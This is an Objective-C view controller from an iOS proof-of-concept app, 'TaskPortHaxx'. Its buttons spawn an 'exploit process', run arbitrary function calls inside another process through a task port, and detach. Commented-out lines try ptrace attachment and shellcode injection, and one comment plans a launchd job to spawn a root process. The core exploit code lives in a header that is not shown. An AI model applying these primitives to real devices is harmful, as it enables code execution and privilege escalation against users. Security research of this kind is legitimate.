//
//  ViewController.m
//  TaskPortHaxxApp
//
//  Created by Duy Tran on 24/10/25.
//

#import "ViewController.h"
#include "Header.h"
#include <sys/wait.h>

@interface ViewController ()
@property(nonatomic) mach_port_t exceptionPort;
@property(nonatomic) pid_t childPid, sleepPid;
@property(nonatomic) UITextView *logTextView;
@end

@implementation ViewController

- (void)viewDidLoad {
    [super viewDidLoad];
    self.navigationItem.title = @"Task Port Haxx";
    self.navigationItem.rightBarButtonItems = @[
        [[UIBarButtonItem alloc] initWithTitle:@"Test" style:UIBarButtonItemStylePlain target:self action:@selector(testButtonTapped)],
        [[UIBarButtonItem alloc] initWithTitle:@"Arb Call" style:UIBarButtonItemStylePlain target:self action:@selector(arbCallButtonTapped)],
        [[UIBarButtonItem alloc] initWithTitle:@"Detach" style:UIBarButtonItemStylePlain target:self action:@selector(detachButtonTapped)]
    ];
        
    
    UITextView *textView = [[UITextView alloc] initWithFrame:self.view.bounds];
    textView.editable = NO;
    textView.autoresizingMask = UIViewAutoresizingFlexibleWidth | UIViewAutoresizingFlexibleHeight;
    textView.text = @"Log Output:\n";
    textView.font = [UIFont monospacedSystemFontOfSize:14 weight:UIFontWeightRegular];
    [self.view addSubview:textView];
    self.logTextView = textView;
    [self redirectStdio];
    
    self.exceptionPort = setup_exception_server();
    self.childPid = -1;
    //self.sleepPid = spawn_sleep_process();
}

- (void)redirectStdio {
    setvbuf(stdout, 0, _IOLBF, 0); // make stdout line-buffered
    setvbuf(stderr, 0, _IONBF, 0); // make stderr unbuffered
    
    /* create the pipe and redirect stdout and stderr */
    static int pfd[2];
    pipe(pfd);
    dup2(pfd[1], fileno(stdout));
    dup2(pfd[1], fileno(stderr));
    
    /* create the logging thread */
    dispatch_async(dispatch_get_global_queue(DISPATCH_QUEUE_PRIORITY_DEFAULT, 0), ^{
        ssize_t rsize;
        char buf[2048];
        while((rsize = read(pfd[0], buf, sizeof(buf)-1)) > 0) {
            if (rsize < 2048) {
                buf[rsize] = '\0';
            }
            NSString *logLine = [NSString stringWithUTF8String:buf];
            dispatch_async(dispatch_get_main_queue(), ^{
                self.logTextView.text = [self.logTextView.text stringByAppendingString:logLine];
                NSRange bottom = NSMakeRange(self.logTextView.text.length -1, 1);
                [self.logTextView scrollRangeToVisible:bottom];
            });
        }
    });
}

- (void)testButtonTapped {
    if (getpgid(_childPid) > 0) {
        printf("Child already spawned with PID %d\n", self.childPid);
        return;
    }
    self.childPid = spawn_exploit_process(self.exceptionPort);
}

- (void)arbCallButtonTapped {
    dispatch_async(dispatch_get_global_queue(DISPATCH_QUEUE_PRIORITY_DEFAULT, 0), ^{
        //xpc_object_t bootstrap_pipe = ((struct xpc_global_data *)_os_alloc_once_table[OS_ALLOC_ONCE_KEY_LIBXPC].ptr)->xpc_bootstrap_pipe;
        
        vm_address_t map = RemoteArbCall(mmap, 0, 0x4000, PROT_READ | PROT_WRITE, MAP_ANON | MAP_PRIVATE, -1, 0);
        printf("Mapped memory at 0x%llx\n", map);
        RemoteWriteString(map, "/tmp/.it_works");
        RemoteArbCall(mkdir, map, 0700);
        
        // submit a launch job to launchd to spawn a root process
        
        //(int)task_get_special_port((int)mach_task_self(), 4, &port); port
        // Can't JIT :(
//        void *ptrace = dlsym(RTLD_DEFAULT, "ptrace");
//        RemoteArbCall(ptrace, PT_ATTACHEXC, self.sleepPid, 0, 0);
//        RemoteArbCall(ptrace, PT_DETACH, self.sleepPid, 0, 0);
//        uint32_t shellcode[] = {
//            0xd2808880, // mov x0, #0x444
//            0xd65f03c0 // ret
//        };
//        RemoteWriteMemory(map, shellcode, sizeof(shellcode));
//        RemoteArbCall(mprotect, map, 0x4000, PROT_READ | PROT_EXEC);
//        _tmp_ptr = (uint64_t)map;
//        RemoteArbCall(((uint64_t (*)(void))map));
        RemoteArbCall(munmap, map, 0x4000);
    });
}

- (void)detachButtonTapped {
    dispatch_async(dispatch_get_global_queue(DISPATCH_QUEUE_PRIORITY_DEFAULT, 0), ^{
        RemoteDetach();
    });
}

- (void)alertWithTitle:(NSString *)title message:(NSString *)message {
    UIAlertController *alert = [UIAlertController alertControllerWithTitle:title message:message preferredStyle:UIAlertControllerStyleAlert];
    UIAlertAction *okAction = [UIAlertAction actionWithTitle:@"OK" style:UIAlertActionStyleDefault handler:nil];
    [alert addAction:okAction];
    [self presentViewController:alert animated:YES completion:nil];
}

@end
